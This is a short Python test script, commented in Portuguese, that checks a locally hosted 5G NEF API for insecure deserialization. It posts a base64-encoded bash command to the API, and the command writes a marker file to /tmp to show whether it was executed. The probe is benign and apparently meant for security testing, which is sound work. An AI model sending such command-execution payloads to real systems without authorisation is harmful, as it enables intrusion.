import requests
import urllib3
import json
import base64
import os

#--- Configurações de Ambiente (Valores do nefcfg.yaml) ---
NF_CONFIG = {
    "NEF_IP": "127.0.0.1",
    "NEF_PORT": 29509
}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def test_deserialization():
    print("=" * 50)
    print("A6 - Testando Insecure Deserialization")
    print("=" * 50)

    nf_api_url = f"http://{NF_CONFIG['NEF_IP']}:{NF_CONFIG['NEF_PORT']}/api/deserialize" 
    target_param = "data"
    payload_command = "bash -c 'echo VULNERABLE > /tmp/desserialization_test.txt'"
    payload_b64 = base64.b64encode(payload_command.encode()).decode('utf-8')
    payload = {target_param: payload_b64}

    try:
        response = requests.post(nf_api_url, headers={"Content-Type": "application/json"}, data=json.dumps(payload), timeout=5)
        if response.status_code in [200, 500, 400] and ("malicious" in response.text.lower() or "exception" in response.text.lower() or os.path.exists("/tmp/desserialization_test.txt")):
            print("[!!!] Possível vulnerabilidade de desserialização detectada! A API retornou um erro ou o comando foi executado.")
        else:
            print("[-] Desserialização Insegura não detectada.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Erro ao testar desserialização: {e}")

if __name__ == "__main__":
    test_deserialization()